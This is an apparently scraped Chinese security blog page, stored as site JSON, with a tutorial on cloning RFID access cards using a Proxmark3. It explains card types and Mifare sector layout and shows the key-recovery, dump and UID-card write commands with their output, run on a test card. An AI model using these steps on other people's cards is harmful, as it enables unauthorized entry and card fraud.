class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">002</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">003</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">004</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">005</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">006</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">007</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">008</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">009</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">010</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">011</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">012</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">013</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">014</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">015</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|</code></pre></p>\n<p>接下来导出密钥<br><pre><code class=\"hljs undefined\">proxmark3&gt; hf mf nested 1 0 A ffffffffffff d\nTesting known keys. Sector count=16\nnested...\nTime in nested: 4.302 (inf sec per key)\n\n-----------------------------------------------\nIterations count: 0\n\n\n|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|\n|<span class=\"hljs-string\">sec</span>|<span class=\"hljs-string\">key A           </span>|<span class=\"hljs-string\">res</span>|<span class=\"hljs-string\">key B           </span>|<span class=\"hljs-string\">res</span>|\n|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|\n|<span class=\"hljs-string\">000</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">001</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">002</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">003</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">004</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">005</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">006</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">007</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">008</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">009</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">010</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">011</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">012</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">013</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">014</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">015</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|\nPrinting keys to binary file dumpkeys.bin...</code></pre></p>\n<p>导出后会在根目录生成一个dumpkeys.bin的文件，里面存放了16个扇区的密钥（16进制）<br><img src=\"/img/2018-07-26/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"></p>\n<h6 id=\"导出数据\"><a href=\"#导出数据\" class=\"headerlink\" title=\"导出数据\"></a>导出数据</h6><p>拿到密码后我们就可以导出卡上的数据到电脑里<br><pre><code class=\"hljs undefined\">proxmark3&gt; hf mf dump\n|-----------------------------------------|\n|------ Reading sector access bits...-----|\n|-----------------------------------------|\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\n\t  .\n\t  .\n\t  .\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\n|-----------------------------------------|\n|----- Dumping all blocks <span class=\"hljs-keyword\">to</span> file... -----|\n|-----------------------------------------|\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\nSuccessfully <span class=\"hljs-keyword\">read</span> <span class=\"hljs-keyword\">block</span>  <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">of</span> sector  <span class=\"hljs-number\">0</span>.\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\nSuccessfully <span class=\"hljs-keyword\">read</span> <span class=\"hljs-keyword\">block</span>  <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">of</span> sector  <span class=\"hljs-number\">0</span>.\n\t  .\n\t  .\n\t  .\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\nSuccessfully <span class=\"hljs-keyword\">read</span> <span class=\"hljs-keyword\">block</span>  <span class=\"hljs-number\">3</span> <span class=\"hljs-keyword\">of</span> sector <span class=\"hljs-number\">15</span>.\nDumped <span class=\"hljs-number\">64</span> blocks (<span class=\"hljs-number\">1024</span> bytes) <span class=\"hljs-keyword\">to</span> file dumpdata.bin</code></pre></p>\n<p>同样16进制打开<br><img src=\"/img/2018-07-26/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"><br>因为是测试卡，所以里面就没什么数据ㄟ( ▔, ▔ )ㄏ。</p>\n<h6 id=\"写入UID卡\"><a href=\"#写入UID卡\" class=\"headerlink\" title=\"写入UID卡\"></a>写入UID卡</h6><p>下一步把数据写进写UID卡<br>Proxmark3不能识别、使用bin文件，需要转换成eml格式<br>第一个方法是运行下面的命令转成eml格式<br><pre><code class=\"hljs undefined\">proxmark3&gt; script run dumptoemul<span class=\"hljs-selector-class\">.lua</span>\n--- Executing: ./scripts/dumptoemul<span class=\"hljs-selector-class\">.lua</span>, args<span class=\"hljs-string\">''</span>\nWrote an emulator-dump to the file EA117DEE<span class=\"hljs-selector-class\">.eml</span>\n\n-----Finished</code></pre></p>\n<p>第二个方法是运行<code>dump to EML.bat</code>脚本转成eml格式<br><img src=\"/img/2018-07-26/10.png\" srcset=\"/img/static/loading.gif\" alt=\"10\"><br>写入到白卡（UID卡）上<br><pre><code class=\"hljs undefined\">proxmark3&gt; hf mf cload  dumpdata\nLoaded <span class=\"hljs-keyword\">from</span> <span class=\"hljs-built_in\">file</span>: dumpdata.eml</code></pre></p>\n<p>写卡是没有回显的，只能通过读取的方式查看有没有读取成功，对比两张卡的数据就可以看到数据是一模一样的，克隆就完成了<br><strong>IC卡破解不止这一种方法，能力和设备有限，以后有机会会继续学习下去</strong></p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><p>&emsp;&emsp;安全不仅仅包含网络上的安全，在我们实际生活中也同样存在很多个安全相关的事物，可以说跟科技扯上关系的事物都会有安全问题，无线，蓝牙，手机，无人机，汽车。<strong>真正有问题的不是安全，而是人心。</strong>很多事物的设计之初都是没有考虑安全问题的，因为人心的不坏好意迫使去考虑它的安全问题。<br>","more":"</p>\n<h4 id=\"硬件准备\"><a href=\"#硬件准备\" class=\"headerlink\" title=\"硬件准备\"></a>硬件准备</h4><h5 id=\"破解设备\"><a href=\"#破解设备\" class=\"headerlink\" title=\"破解设备\"></a>破解设备</h5><p>Proxmark3 Easy<br><img src=\"/img/2018-07-26/Proxmark3.jpg\" srcset=\"/img/static/loading.gif\" alt=\"Proxmark3 Easy\"><br>破解工具不一定是Proxmark3 Easy，只要是还能够获取和修改卡片数据的设备都可以，比如arc122u，arc122u只能读取和修改高频卡，有点不足<br><img src=\"/img/2018-07-26/arc122u.jpg\" srcset=\"/img/static/loading.gif\" alt=\"arc122u\"></p>\n<h5 id=\"各种卡\"><a href=\"#各种卡\" class=\"headerlink\" title=\"各种卡\"></a>各种卡</h5><p>准备一些ID，IC卡<br><img src=\"/img/2018-07-26/ka.jpg\" srcset=\"/img/static/loading.gif\" alt=\"ka\"><br>这不都长一个样么（＃－.－）</p>\n<h5 id=\"区分ID卡和IC卡的方法\"><a href=\"#区分ID卡和IC卡的方法\" class=\"headerlink\" title=\"区分ID卡和IC卡的方法\"></a>区分ID卡和IC卡的方法</h5><ol>\n<li>光照法<br><img src=\"/img/2018-07-26/1.jpg\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br><img src=\"/img/2018-07-26/2.jpg\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>圆形大多是ID卡，方形大多是IC卡</li>\n<li>NFC法<br>拿一部带有NFC功能的手机打开NFC，卡片靠近手机会响的是IC卡，不会响的是ID卡</li>\n</ol>\n<h4 id=\"知识准备\"><a href=\"#知识准备\" class=\"headerlink\" title=\"知识准备\"></a>知识准备</h4><p>&emsp;&emsp;首先，门禁卡所用到的技术是RFID，具体详情可以看这里–&gt;<a href=\"https://baike.baidu.com/item/%E5%B0%84%E9%A2%91%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF/9524139?fromtitle=RFID&amp;fromid=497249\" target=\"_blank\" rel=\"noopener\">传送门</a>，首先从频率上可以分为高频（13.56MHZ）和低频两种类型的卡，在这两个频率上又会分为多种类型的卡。常见的卡的有</p>\n<style>\ntable th:first-of-type {  \n    width: 25%; \n}\ntable th:nth-of-type(2) {  \n    width: 7%; \n}\ntable th:nth-of-type(3) {  \n    width: 68%; \n}\n</style>\n\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th style=\"text-align:center\">频率</th>\n<th>特性</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Mifare S50(简称M1)</td>\n<td style=\"text-align:center\">高频</td>\n<td>最常见的卡，每张卡有独一无二的UID号，可保存修改数据,常见学生卡，饭卡，公交卡，门禁卡</td>\n</tr>\n<tr>\n<td>Mifare UltraLight（简称M0）</td>\n<td style=\"text-align:center\">高频</td>\n<td>低成本卡，出厂固化UID，可储存修改数据，常见地铁卡，公交卡</td>\n</tr>\n<tr>\n<td>Mifare UID（简称UID卡）</td>\n<td style=\"text-align:center\">高频</td>\n<td>M1卡的变异版本，可修改UID，国外叫做中国魔术卡，可以用来克隆M1 S50的数据</td>\n</tr>\n<tr>\n<td>EM4XX（简称ID卡）</td>\n<td style=\"text-align:center\">低频</td>\n<td>常用固化ID卡，出厂固化ID，只能读不能写（低成本门禁卡，小区门禁卡，停车场门禁卡）</td>\n</tr>\n<tr>\n<td>T5577（简称可修改ID卡）</td>\n<td style=\"text-align:center\">低频</td>\n<td>可用来克隆ID卡，出厂为空卡，内有三区也可储存数据，个别三区科设置密码</td>\n</tr>\n<tr>\n<td>HID ProxⅡ（简称HID卡）</td>\n<td style=\"text-align:center\">低频</td>\n<td>美国常用的低频卡，可擦写，不与其他卡通用</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"高频\"><a href=\"#高频\" class=\"headerlink\" title=\"高频\"></a>高频</h5><h6 id=\"M1-S50卡\"><a href=\"#M1-S50卡\" class=\"headerlink\" title=\"M1 S50卡\"></a>M1 S50卡</h6><p>&emsp;&emsp;目前最常见的高频卡，也是我们口中俗称的IC卡。M1卡科储存的数据大小为8k，分为16个扇区，每个扇区分4个块，每个块为16个字节，以块为存取单位。<strong>每个扇区都有独立的一组密码及访问控制</strong>，每张卡有唯一的一个32位的序列号。每个扇区的0,1,2块为数据块，用来存储数据，第3块为控制块，包括了密A、存取控制、密码B<br>每张卡的第0扇区的第0块用来春芳厂商代码，不可更改。<br><pre><code class=\"hljs undefined\">扇区<span class=\"hljs-number\">0</span>\t<span class=\"hljs-number\">03332801198804008500</span>b42ef0bb6aa8 块<span class=\"hljs-number\">0</span>\t \t<span class=\"hljs-comment\">//厂商代码，不可更改</span>\n\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">1</span>\t \t<span class=\"hljs-comment\">//数据块</span>\n\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">2</span> \t\t<span class=\"hljs-comment\">//数据块</span>\n\tffffffffffffff078069ffffffffffff 块<span class=\"hljs-number\">3</span> \t\t<span class=\"hljs-comment\">//密码A（6字节），存储控制（4字节），密码B（6字节）</span>\n\n扇区<span class=\"hljs-number\">1</span>\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">4</span> \t\t<span class=\"hljs-comment\">//出了第0扇区稍有不同，其他15个扇区结构完全一样</span>\n\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">5</span>\n\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">6</span>\n\tffffffffffffff078069ffffffffffff 块<span class=\"hljs-number\">7</span>\n\t\t        .\n\t\t        .\n\t\t        .   \n扇区<span class=\"hljs-number\">15</span>\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">60</span>\n\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">61</span>\n\t<span class=\"hljs-number\">00000000000000000000000000000000</span> 块<span class=\"hljs-number\">62</span>\n\tffffffffffffff078069ffffffffffff 块<span class=\"hljs-number\">63</span></code></pre></p>\n<p>&emsp;&emsp;中间4字节控制字是管理密码权限，用来设置A密码和B密码的功能。默认不修改的时候，可以用A密码读写所有数据。A密码不可读出，B密码可以用A密码读出。<strong>密码不一定可以读取，由控制字决定。</strong></p>\n<h6 id=\"M1-UID卡\"><a href=\"#M1-UID卡\" class=\"headerlink\" title=\"M1 UID卡\"></a>M1 UID卡</h6><p>&emsp;&emsp;M1 UID卡是针对M1 S50卡特制的变种卡，用起来和M1 S50完全一样，只是多了一个功能，就是0扇区块的数据可以随意修改。因此UID号也可以随意修改，厂家信息也可以随意修改。UID卡修改0扇区0块数据是靠指令进入工厂模式，可以直接对全卡任何数据编辑，不需要密码即可读写卡，同时不怕写坏卡，即使写错0块，写坏扇区控制字，也可以随时修复回来，不影响后续使用。</p>\n<h6 id=\"FUID卡\"><a href=\"#FUID卡\" class=\"headerlink\" title=\"FUID卡\"></a>FUID卡</h6><p>&emsp;&emsp;FUID卡是针对UID卡做的优化。新的读卡系统，通过检测卡片对特殊指令的回应，可以检测出UID卡，因此可以来拒绝UID卡的访问，来达到屏蔽复制卡的功能。<strong>FUID可以修改0块，但只可以修改一次</strong>，写错也没办法更改，也不能重复利用。修改后和M1卡完全一样，很难被屏蔽检测。</p>\n<h6 id=\"CUID卡\"><a href=\"#CUID卡\" class=\"headerlink\" title=\"CUID卡\"></a>CUID卡</h6><p>&emsp;&emsp;CUID卡是针对FUID卡做的优化。CUID卡可以重复修改0块，但是它和UID卡的区别是，UID卡是通过<strong>指令</strong>修改0块，CUID使用的是常规密码验证的方法写0块，其他扇区和标准M1卡相同。缺点是，还是有可能会被检测出来，而且如果不小心写错了UID号的校验位导致无法读卡，没办法修复只能报废。</p>\n<h5 id=\"低频\"><a href=\"#低频\" class=\"headerlink\" title=\"低频\"></a>低频</h5><h6 id=\"ID卡\"><a href=\"#ID卡\" class=\"headerlink\" title=\"ID卡\"></a>ID卡</h6><p>&emsp;&emsp;ID卡是我们的俗称，内部芯片的全名叫做EM4100或EM41XX。每张卡出厂就有独一无二的ID号，不可改写。</p>\n<h6 id=\"T5577卡\"><a href=\"#T5577卡\" class=\"headerlink\" title=\"T5577卡\"></a>T5577卡</h6><p>&emsp;&emsp;T5577 卡是一种可以写入数据可以加密的低频卡。最特别之处是，写入ID号可以变身成为ID卡，写入HID号可以变身HID卡，写入Indala卡号，可以变身Indala卡。T5577一共有8个块，每个块只能存8位数。第0块是用来设置卡片类型和调制方式的，决定了卡片是ID卡还是HID卡，如果随意修改会导致读不到卡。最后一个块，在没有加密时是数据区，加密后，其数据就变成了密码。结构如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-number\">0x00148040</span>  <span class=\"hljs-number\">00000000000101001000000001000000</span> [<span class=\"hljs-number\">0</span>]\n<span class=\"hljs-number\">0xFF94C004</span>  <span class=\"hljs-number\">11111111100101001100000000000100</span> [<span class=\"hljs-number\">1</span>]\n<span class=\"hljs-number\">0xA5464942</span>  <span class=\"hljs-number\">10100101010001100100100101000010</span> [<span class=\"hljs-number\">2</span>]\n<span class=\"hljs-number\">0xFFFFF808</span>  <span class=\"hljs-number\">11111111111111111111100000001000</span> [<span class=\"hljs-number\">3</span>]\n<span class=\"hljs-number\">0x0001C000</span>  <span class=\"hljs-number\">00000000000000011100000000000000</span> [<span class=\"hljs-number\">4</span>]\n<span class=\"hljs-number\">0x0001C000</span>  <span class=\"hljs-number\">00000000000000011100000000000000</span> [<span class=\"hljs-number\">5</span>]\n<span class=\"hljs-number\">0x0001C000</span>  <span class=\"hljs-number\">00000000000000011100000000000000</span> [<span class=\"hljs-number\">6</span>]\n<span class=\"hljs-number\">0x0001C000</span>  <span class=\"hljs-number\">00000000000000011100000000000000</span> [<span class=\"hljs-number\">7</span>]</code></pre></p>\n<h4 id=\"破解\"><a href=\"#破解\" class=\"headerlink\" title=\"破解\"></a>破解</h4><h5 id=\"破解ID卡\"><a href=\"#破解ID卡\" class=\"headerlink\" title=\"破解ID卡\"></a>破解ID卡</h5><h6 id=\"安装驱动\"><a href=\"#安装驱动\" class=\"headerlink\" title=\"安装驱动\"></a>安装驱动</h6><p>驱动下载官网网址–&gt;<a href=\"https://store.ryscc.com/blogs/news/how-to-install-a-proxmark3-driver-on-windows-10\" 